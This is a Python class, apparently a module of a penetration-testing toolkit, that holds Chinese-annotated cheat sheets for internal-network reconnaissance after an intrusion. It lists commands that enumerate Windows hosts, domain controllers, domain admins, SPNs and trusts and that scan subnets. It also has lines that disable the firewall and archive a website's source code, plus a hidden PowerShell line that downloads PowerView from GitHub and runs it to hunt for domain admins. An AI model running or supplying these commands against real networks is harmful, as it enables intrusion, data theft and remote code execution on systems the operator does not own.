# encoding: utf8
class Shell:
    def __init__(self):
        self.info = {
            'Name': '内网信息收集',
            'Author': 'nul1',
            'Update': '2020/7/06',
        }

    def windows_tips(self):
        return """
1.  查询当前用户       query user || qwinsta
2.  查询进程列表       tasklist || wmic process list brief
3.  查询启动项         wmic startup get command,caption
4.  查询服务           tasklist /svc
5.  列出会话           net session
6.  查询补丁           wmic qfe get Caption,Description,HotFixID,InstalledOn
7.  软件列表           wmic product get name,version
8.  查询系统架构       echo %PROCESSOR_ARCHITECTURE%
9.  源码打包           C:\Program Files (x86)\winrar\\rar.exe a -k -r -s -m1 C:\\bak.rar C:\网站源码
10. 查询计划任务       schtasks /query /fo LIST /v
11. 查看开机时间       net statistics workstation
12. 查询共享列表       net share || wmic share get name,path,status
13. 查询路由表和ARP    route print || arp -a
14. 查看代理信息       reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
15. 查看防火墙配置     netsh firewall show config
16. 关闭防火墙         netsh firewall set opmode disable            (<= win2003)
                      netsh advfirewall set allprofiles state off   (> win2003)
"""

    def one(self):
        return """
1. 定位是否域环境
        ifconfig /all
        systeminfo
        net config workstation
        net time /domain   
        
2. 定位域控制器   
        net time /domain     
        nltest /DCLIST:google
        net group "Domain Controllers" /domain  
        
3. 定位域管理员
        PVEFindADUser.exe -current 
        psloggedon //dc
        Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Invoke-UserHunter
              
"""

    def two(self):
        return """
1. 查询域内用户信息        net user /domain
2. 查询域内详细信息        wmic useraccount get /all
3. 查询存在的用户          dsquery user
4. 查询域管理员用户        net group "domain admins" /domain

"""


    def three(self):
        return """
1.  域传输
        nslookup -type ns xxx.com;ls xx.com
        dig axfr xxx.com
2.  SPN查询           
        setspn -T google.com -Q */*  
3.  查询域            
        net view /domain
4.  查询域管理组       
        net group "domain admins" /domain
5.  查询密码策略       
        net accounts /domain
6.  获取域信任信息     
        nltest /domain_trusts
                     
"""

    def scan(self):
        return """
1. ICMP
    for /L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I | findstr TTL=  
    
2. powershell
    1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("127.0.0.1",$_)) "Port $_ is open!"} 2>$null
    1..254 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.10.10.$_",3389)) "10.10.10.$_ i s open!"} 2>$null
    
3. telnet
    for /l %a in (1,1,254) do start /min /low telnet 192.168.0.%a 3389      
    
4. NC
    for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done
        
5. NetBIOS
    nbtscan 10.10.10.1/24
    
6. ARP
    arp-scan 10.10.10.1/24
    
"""

